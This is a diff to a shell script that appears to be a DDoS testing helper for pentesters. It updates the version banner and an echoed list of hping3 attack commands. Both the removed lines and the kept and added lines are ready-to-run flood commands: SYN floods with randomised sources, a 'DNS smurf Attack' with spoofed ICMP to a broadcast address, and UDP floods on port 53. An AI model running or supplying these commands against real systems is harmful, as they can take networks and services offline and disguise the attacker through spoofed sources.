@@ -19,7 +19,7 @@ echo "
                             |_|                                             |___|
 
 \r\n \r\n
-Version:  0.0.2                             \r\n
+Version:  0.0.5                             \r\n
 Last Updated:  4/10/2018
 \r\n \r\n
 Updating system first..."
@@ -55,16 +55,15 @@ wait
 
 ### Examples ###
 # https://pentest.blog/how-to-perform-ddos-test-as-a-pentester/
+# https://www.slideshare.net/Himani-Singh/type-of-ddos-attacks-with-hping3-example
 
 echo "  \r\n \r\n \r\n
- hping3 -V -c 1000000 -d 120 -S -w 64 -p 443 -s 443 --flood --rand-source 10.1.1.1    \r\n
- hping3 -2 -c 1000000 -s 5151 -p 80  --rand-source 10.1.1.1                   \r\n
- hping3 -S -P -U --flood -V --rand-source 10.1.1.1                              \r\n
- hping3 -c 20000 -d 120 -S -w 64 -p 443 --flood --rand-source 10.1.1.1           \r\n
-
-
 DNS smurf Attack:  hping3 --icmp --spoof TARGET_IP BROADCAST_IP    \r\n
- 
+hping3 192.168.1.1 -I eth2 -q -n --udp -d 110 -p 53 --flood --rand-source  \r\n
+hping3 10.1.1.13 --rand-dest -I eth1 --udp -q -d 80 -p 53 --faster -c 400   \r\n
+hping3 10.1.1.13 -I eth0 --udp -p 53 --i u1000  \r\n
+
+\r\n \r\n
 "
 
 
